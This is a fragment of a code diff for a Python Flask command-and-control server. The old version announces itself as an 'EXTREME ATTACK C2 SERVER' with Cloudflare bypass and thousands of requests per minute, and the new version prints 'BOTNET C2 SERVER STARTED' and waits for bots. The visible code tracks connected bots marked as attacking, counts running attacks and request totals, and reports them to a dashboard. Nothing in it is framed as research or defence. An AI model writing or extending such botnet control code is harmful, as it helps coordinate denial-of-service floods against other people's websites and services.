-            print(f"[-] Client disconnected: {client.name}")
-            socketio.emit('client_disconnected', {
-                'client_id': client_id,
-                'total_clients': len(clients)
-            })
-
-def background_tasks():
-    while True:
-        try:
-            with client_lock:
-                total = len(clients)
-                attacking = len([c for c in clients.values() if c.status == 'attacking'])
-            
-            with attack_lock:
-                active = len([a for a in attacks.values() if a.status in ['running', 'pending']])
-                total_requests = sum(a.results["total_requests"] for a in attacks.values())
-            
-            socketio.emit('system_stats', {
-                'clients': {'total': total, 'attacking': attacking},
-                'attacks': {'active': active, 'total_requests': total_requests}
-            })
-            
-            time.sleep(2)
-        except:
-            time.sleep(5)
+    return jsonify({"status": "success", "results": results})
 
 if __name__ == '__main__':
-    print("""
-    ╔══════════════════════════════════════╗
-    ║   EXTREME ATTACK C2 SERVER          ║
-    ║   Thousands of Requests/Min         ║
-    ║   Cloudflare Bypass Enabled         ║
-    ╚══════════════════════════════════════╝
-    """)
-    
-    threading.Thread(target=background_tasks, daemon=True).start()
-    
-    print(f"[📡] Server starting on port {PORT}")
-    print(f"[🔗] Web: http://localhost:{PORT}")
-    print(f"[💥] Ready for extreme attacks\n")
-    
-    socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_werkzeug=True)
+    print("=" * 60)
+    print("🤖 BOTNET C2 SERVER STARTED 🤖")
+    print("=" * 60)
+    print("\n[*] Web Dashboard: http://localhost:5000")
+    print("[*] Waiting for bots to connect...\n")
+    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
